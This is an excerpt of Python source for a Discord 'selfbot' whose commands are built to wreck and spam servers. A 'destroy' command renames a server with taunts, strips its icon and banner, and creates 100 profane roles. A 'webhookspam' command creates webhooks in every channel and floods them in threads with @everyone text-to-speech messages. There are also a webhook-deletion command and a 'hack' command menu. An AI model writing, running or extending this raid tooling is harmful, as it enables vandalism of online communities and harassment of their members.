...
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name='DereK SELFBOT OP', url='https://youtube.com/channel/UCX0y47HP2rbqPvBjVSAe2Sw'))
    print('Im Ready\nDereKplayZ OP')
...
async def help(ctx):
    ...
    embed.set_author(name='DEREK  SELFBOT')
    embed.set_thumbnail(url='https://i.imgur.com/ZUbZ55y.gif')
    embed.set_footer(text='Created by DereKplayZ')
...
async def text(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='DEREK SELFBOT | TEXT CMDS')
    embed.set_footer(text='Created by DereKplayZ')
...
async def hack(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='DEREK SELFBOT | HACK CMDS')
    embed.set_footer(text='Created by DereKplayZ')
...
async def nuke(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='DEREK SELFBOT | NUKE CMDS')
    embed.set_footer(text='Created by DereKplayZ')
    ...
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']),
              ...
              inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            em.set_footer(text='Created by DereKplayZ')
...
async def destroy(ctx):
    ...
    try:
        await ctx.guild.edit(name='TRASHED BY DereKplayZ',
          description='DereKplayZ got no chill',
          reason='ripped by DereKplayZ',
          icon=None,
          banner=None)
    except:
        pass
    ...
    for _i in range(100):
        await ctx.guild.create_role(name='DEREK fucks you', color=(RandomColor()))
...
async def delwebhook(ctx, link=None):
    if link == None:
        embed = discord.Embed(title='DEREK SELFBOT', description='```>delwebhook <webhook>```')
        embed.set_footer(text='Created By DereKplayZ')
        await ctx.message.edit(content='', embed=embed)
    else:
        embed = discord.Embed(title='DEREK SELFBOT', description=f"Sending a delete request to\n{link}")
        embed.set_footer(text='Created by RisinPlayZ')
        await ctx.message.edit(content='', embed=embed)
        result = requests.delete(link)
        if result.status_code == 204:
            embed = discord.Embed(title='DEREK SELFBOT', description='WEBHOOK DELETED')
            embed.set_footer(text='Created by DereKplayZ')
            await ctx.message.edit(embed=embed)
        else:
            embed = discord.Embed(title='DereK SELBOT', description=f"Delete request responded with status code : {result.status_code}\\{result.text}")
            embed.set_footer(text='Created by DereKplayZ')
            await ctx.message.edit(embed=embed)
...
def ssspam(webhook):
    while spammingdawebhookeroos:
        ...
        data = {'content':'@everyone DEREK RUNS CORD',
         'embeds':[
          {'title':'DEREK SELFBOT OP',
           'tts':'true',
           'description':'.',
           'url':'https://instragram.com/DereKplayZ',
           'color':randcolor,
           'fields':[
            {'name':'DEREK SELFBOT',
             'value':'.'},
            ...
            {'name':'.',
             'value':'.'}],
           'author':{'name':'DEREK SELFBOT',
            'url':'https://imgur.com/Lib5iyC',
            'icon_url':'https://cdn.discordapp.com/attachments/858268830211768340/858303909512478740/847383693755809812.gif'},
           'footer':{'text':'Created by DereKplayZ',
            'icon_url':'https://cdn.discordapp.com/attachments/858268830211768340/858303909512478740/847383693755809812.gif'},
           'image':{'url': 'https://cdn.discordapp.com/attachments/858268830211768340/858303909512478740/847383693755809812.gif'},
           'thumbnail':{'url': 'https://cdn.discordapp.com/attachments/858268830211768340/858303909512478740/847383693755809812.gif'}},
          {'url':'https://instgram.com/DereKplayZ',
           'image':{'url': 'https://cdn.discordapp.com/attachments/858268830211768340/858303909512478740/847383693755809812.gif'}},
          {'url':'https://instagram.com/DereKplayZ',
           'image':{'url': 'https://cdn.discordapp.com/attachments/858268830211768340/858303909512478740/847383693755809812.gif'}},
          {'url':'https://instagram.com/DereKplayZ',
           'image':{'url': 'https://cdn.discordapp.com/attachments/858268830211768340/858303909512478740/847383693755809812.gif'}}],
         'username':'WIZZED BY DereKplayZ',
         'avatar_url':'https://cdn.discordapp.com/attachments/858268830211768340/858303909512478740/847383693755809812.gif'}
...
async def webhookspam(ctx):
    ...
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Wizzed by DereKplayZ')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
...
async def embed(ctx, *, description):
    embed = discord.Embed(title='DEREK SELFBOT', description=description)
    embed.set_footer(text='Created by DereKplayZ')
    await ctx.send(embed=embed)
